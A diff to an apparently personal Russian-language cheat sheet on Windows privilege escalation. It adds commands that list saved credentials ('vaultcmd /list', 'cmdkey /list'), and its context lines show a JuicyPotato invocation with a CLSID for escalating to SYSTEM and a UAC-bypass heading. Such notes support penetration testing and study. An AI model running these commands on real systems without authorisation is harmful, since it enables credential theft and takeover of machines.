@@ -1,5 +1,13 @@
 # Up_windows
 
+# Credential Manager
+
+vaultcmd /list
+
+# Посмотреть сохраненный креды
+
+cmdkey /list
+
 # повышение привелегий серез UAC
 
 msconfig
@@ -86,9 +94,6 @@ http://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_Datacenter/
 
 .\JuicyPotato.exe -t * -p C:\users\userpool\desktop\start.bat -l 1338 -c '{d20a3293-3341-4ae8-9aaf-8e397cb63c34}'
 
-# Посмотреть сохраненный креды
-
-cmdkey /list
 
 # Подсказки для виндовс
 
